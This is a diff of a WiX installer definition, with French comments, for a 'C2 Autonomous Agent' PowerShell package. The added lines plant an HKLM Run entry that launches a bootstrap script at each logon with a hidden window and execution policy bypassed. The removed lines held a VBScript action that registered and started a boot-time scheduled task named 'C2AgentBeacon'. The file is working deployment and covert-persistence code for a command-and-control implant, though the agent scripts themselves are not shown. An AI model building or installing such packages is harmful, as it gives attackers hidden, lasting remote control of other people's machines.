@@ -1,33 +1,33 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"
-     xmlns:util="http://schemas.microsoft.com/wix/UtilExtension">
-    <Product Id="*" 
-             Name="C2 Autonomous Agent" 
-             Language="1033" 
-             Version="1.0.0.0" 
+<!-- Schema WiX v3 (compile avec wixl sur Linux).                              -->
+<!-- Aucune custom action : wixl ne les execute pas. La tache planifiee est    -->
+<!-- creee au 1er login via l'entree HKLM\...\Run -> bootstrap.ps1.            -->
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+    <Product Id="*"
+             Name="C2 Autonomous Agent"
+             Language="1033"
+             Version="1.0.0.0"
              Manufacturer="Security Team"
-             UpgradeCode="12345678-1234-1234-1234-123456789012"
-             Codepage="65001">
-        
-        <Package InstallerVersion="200" 
-                 Compressed="yes" 
-                 InstallScope="perMachine" />
+             UpgradeCode="12345678-1234-1234-1234-123456789012">
 
-        <!-- Table Binary pour encapsuler les scripts -->
-        <Binary Id="AgentActiveBinary" SourceFile="agent_active.ps1" />
-        <Binary Id="LauncherBinary" SourceFile="launcher.ps1" />
+        <Package InstallerVersion="200"
+                 Compressed="yes"
+                 InstallScope="perMachine" />
 
         <Media Id="1" Cabinet="C2Agent.cab" EmbedCab="yes" />
 
         <!-- Feature principale -->
         <Feature Id="ProductFeature" Title="C2 Autonomous Agent" Level="1">
+            <ComponentRef Id="InstallFolder" />
             <ComponentRef Id="AgentExecutable" />
             <ComponentRef Id="LauncherScript" />
-            <ComponentRef Id="InstallFolder" />
+            <ComponentRef Id="RegisterTaskScript" />
+            <ComponentRef Id="BootstrapScript" />
+            <ComponentRef Id="AutoStartBootstrap" />
             <ComponentRef Id="ApplicationShortcuts" />
         </Feature>
 
-        <!-- Répertoire d'installation -->
+        <!-- Repertoires -->
         <Directory Id="TARGETDIR" Name="SourceDir">
             <Directory Id="ProgramFilesFolder">
                 <Directory Id="INSTALLFOLDER" Name="C2Agent" />
@@ -35,105 +35,55 @@
             <Directory Id="ProgramMenuFolder" />
         </Directory>
 
-        <!-- Composants à installer -->
+        <!-- Composants a installer -->
         <DirectoryRef Id="INSTALLFOLDER">
-            <!-- Dossier principal -->
-            <Component Id="InstallFolder" Guid="*">
+            <!-- Dossier + cle registre du chemin d'install -->
+            <Component Id="InstallFolder" Guid="22222222-2222-2222-2222-222222222222">
                 <CreateFolder />
                 <RegistryValue Root="HKLM" Key="Software\C2Agent" Name="InstallPath" Value="[INSTALLFOLDER]" Type="string" KeyPath="yes" />
             </Component>
 
-            <!-- Script PowerShell agent -->
+            <!-- Agent principal -->
             <Component Id="AgentExecutable" Guid="11111111-1111-1111-1111-111111111111">
-                <File Id="AgentPS1" 
-                      Name="agent_active.ps1" 
-                      Source="agent_active.ps1" 
-                      KeyPath="yes" />
+                <File Id="AgentPS1" Name="agent_active.ps1" Source="agent_active.ps1" KeyPath="yes" />
             </Component>
 
-            <!-- ConfigFile removed during build -->
-
-            <!-- Script wrapper pour lancer l'agent -->
+            <!-- Launcher (parametres injectes au build) -->
             <Component Id="LauncherScript" Guid="33333333-3333-3333-3333-333333333333">
-                <File Id="LauncherPS1" 
-                      Name="launcher.ps1" 
-                      Source="launcher.ps1.injected" 
-                      KeyPath="yes" />
+                <File Id="LauncherPS1" Name="launcher.ps1" Source="launcher.ps1.injected" KeyPath="yes" />
+            </Component>
+
+            <!-- Script d'enregistrement de la tache planifiee -->
+            <Component Id="RegisterTaskScript" Guid="44444444-4444-4444-4444-444444444444">
+                <File Id="RegisterTaskPS1" Name="register-task.ps1" Source="register-task.ps1" KeyPath="yes" />
+            </Component>
+
+            <!-- Script de bootstrap (lance au login, cree la tache au 1er passage) -->
+            <Component Id="BootstrapScript" Guid="66666666-6666-6666-6666-666666666666">
+                <File Id="BootstrapPS1" Name="bootstrap.ps1" Source="bootstrap.ps1" KeyPath="yes" />
+            </Component>
+
+            <!-- Entree HKLM\...\Run : lance bootstrap.ps1 a chaque ouverture de session -->
+            <Component Id="AutoStartBootstrap" Guid="77777777-7777-7777-7777-777777777777">
+                <RegistryValue Root="HKLM"
+                               Key="Software\Microsoft\Windows\CurrentVersion\Run"
+                               Name="C2AgentBootstrap"
+                               Value="powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File &quot;[INSTALLFOLDER]bootstrap.ps1&quot;"
+                               Type="string"
+                               KeyPath="yes" />
             </Component>
         </DirectoryRef>
 
-        <!-- Raccourci de désinstallation -->
+        <!-- Raccourci de desinstallation -->
         <DirectoryRef Id="ProgramMenuFolder">
             <Component Id="ApplicationShortcuts" Guid="55555555-5555-5555-5555-555555555555">
                 <Shortcut Id="UninstallProduct"
-                         Name="Uninstall C2 Agent"
-                         Target="[SystemFolder]msiexec.exe"
-                         Arguments="/x [ProductCode]" />
+                          Name="Uninstall C2 Agent"
+                          Target="[SystemFolder]msiexec.exe"
+                          Arguments="/x [ProductCode]" />
                 <RemoveFolder Id="ProgramMenuFolder" On="uninstall" />
-                <RegistryValue Root="HKCU" 
-                              Key="Software\C2Agent" 
-                              Name="Installed" 
-                              Value="1" 
-                              Type="integer" 
-                              KeyPath="yes" />
+                <RegistryValue Root="HKCU" Key="Software\C2Agent" Name="Installed" Value="1" Type="integer" KeyPath="yes" />
             </Component>
         </DirectoryRef>
-
-        <!-- Custom Action pour sécuriser les scripts et créer la tâche planifiée de façon fiable -->
-        <CustomAction Id="SecureScripts" 
-                      Script="vbscript"
-                      Execute="deferred"
-                      Impersonate="no"
-                      Return="check">
-            <![CDATA[
-            On Error Resume Next
-            Set objFSO = CreateObject("Scripting.FileSystemObject")
-            Set objShell = CreateObject("WScript.Shell")
-
-            Dim installPath
-            installPath = "C:\Program Files\C2Agent"
-
-            ' 1. Vérifier que les scripts existent et les marquer en lecture seule
-            If objFSO.FileExists(installPath & "\agent_active.ps1") Then
-                Set objFile = objFSO.GetFile(installPath & "\agent_active.ps1")
-                objFile.Attributes = objFile.Attributes Or 1
-            End If
-
-            If objFSO.FileExists(installPath & "\launcher.ps1") Then
-                Set objFile = objFSO.GetFile(installPath & "\launcher.ps1")
-                objFile.Attributes = objFile.Attributes Or 1
-            End If
-
-            ' 2. Créer ou remplacer la tâche planifiée puis la démarrer immédiatement
-            Dim psCommand
-            psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command """ & _
-                        "$ErrorActionPreference='Stop'; " & _
-                        "$taskName='C2AgentBeacon'; " & _
-                        "$launcherPath = Join-Path 'C:\\Program Files\\C2Agent' 'launcher.ps1'; " & _
-                        "if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue }; " & _
-                        "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -ExecutionPolicy Bypass -File \"$launcherPath\"'; " & _
-                        "$trigger = New-ScheduledTaskTrigger -AtStartup; " & _
-                        "$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew; " & _
-                        "$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Description 'C2 Agent Beacon - Starts at boot'; " & _
-                        "Register-ScheduledTask -TaskName $taskName -TaskPath '\\' -InputObject $task -Force | Out-Null; " & _
-                        "Start-ScheduledTask -TaskName $taskName -ErrorAction Stop; " & _
-                        "Write-Output 'C2AgentBeacon scheduled task created and started successfully.'; " & _
-                        """"
-
-            Dim exitCode
-            exitCode = objShell.Run(psCommand, 0, True)
-
-            If exitCode <> 0 Then
-                WScript.Quit exitCode
-            End If
-            ]]>
-        </CustomAction>
-
-        <!-- Séquence d'exécution des actions -->
-        <InstallExecuteSequence>
-            <Custom Action="SecureScripts" After="InstallFiles">NOT REMOVE</Custom>
-        </InstallExecuteSequence>
     </Product>
 </Wix>
-
-
